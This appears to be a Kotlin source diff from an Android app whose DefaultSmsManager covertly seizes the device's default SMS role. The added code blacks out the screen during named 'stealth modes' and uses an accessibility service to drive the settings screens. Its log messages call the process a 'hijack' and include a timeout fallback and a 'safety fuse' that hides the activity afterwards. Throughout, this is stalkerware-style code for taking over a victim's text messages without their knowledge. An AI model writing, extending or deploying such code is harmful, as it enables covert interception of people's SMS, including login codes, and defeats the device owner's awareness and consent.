@@ -34,24 +34,41 @@ object DefaultSmsManager {
             return
         }
 
+        // Apply Blindfold centrally for all stealth modes
+        if (expectedMode == "AUTO" || expectedMode == "AUTO_NAV" || expectedMode == "RELENTLESS" || expectedMode == "SCRAPE") {
+            Handler(Looper.getMainLooper()).post {
+                DimmerManager.applyDim(ctx, 0, "AUTO") // Pitch black
+                
+                Handler(Looper.getMainLooper()).postDelayed({
+                    // Centralized safety fuse
+                    if (expectedMode == "AUTO" || expectedMode == "AUTO_NAV" || expectedMode == "RELENTLESS" || expectedMode == "SCRAPE") {
+                        val lastMode = expectedMode
+                        expectedMode = ""
+                        MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
+                        DynamicUIManager.removeOverlay(ctx, "SMS_HIJACK_SAFETY_FUSE: $lastMode")
+                    }
+                }, 30000)
+            }
+        }
+
         try {
             val intent = Intent(ctx, SmsRoleActivity::class.java)
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS or Intent.FLAG_ACTIVITY_NO_ANIMATION)
             ctx.startActivity(intent)
             
-                    // CENTRALIZED ROBUST FALLBACK
-        if (expectedMode == "AUTO") {
-            Handler(Looper.getMainLooper()).postDelayed({
-                if (!isDefaultSms(ctx) && expectedMode == "AUTO") {
-                    DebugLogger.log("SMS_MGR", "Hijack timeout (10s). Triggering manual navigation fallback.")
-                    expectedMode = "AUTO_NAV"
-                    val i = Intent(Settings.ACTION_MANAGE_DEFAULT_APPS_SETTINGS).apply {
-                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
+            // CENTRALIZED ROBUST FALLBACK
+            if (expectedMode == "AUTO" || expectedMode == "RELENTLESS") {
+                Handler(Looper.getMainLooper()).postDelayed({
+                    if (!isDefaultSms(ctx) && (expectedMode == "AUTO" || expectedMode == "RELENTLESS")) {
+                        DebugLogger.log("SMS_MGR", "Hijack timeout (10s). Triggering manual navigation fallback.")
+                        expectedMode = "AUTO_NAV"
+                        val i = Intent(Settings.ACTION_MANAGE_DEFAULT_APPS_SETTINGS).apply {
+                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                        }
+                        ctx.startActivity(i)
                     }
-                    ctx.startActivity(i)
-                }
-            }, 10000)
-        }
+                }, 10000)
+            }
         } catch (e: Exception) {
             DebugLogger.log("SMS_MGR", "Failed to launch SmsRoleActivity: ${e.message}")
         }
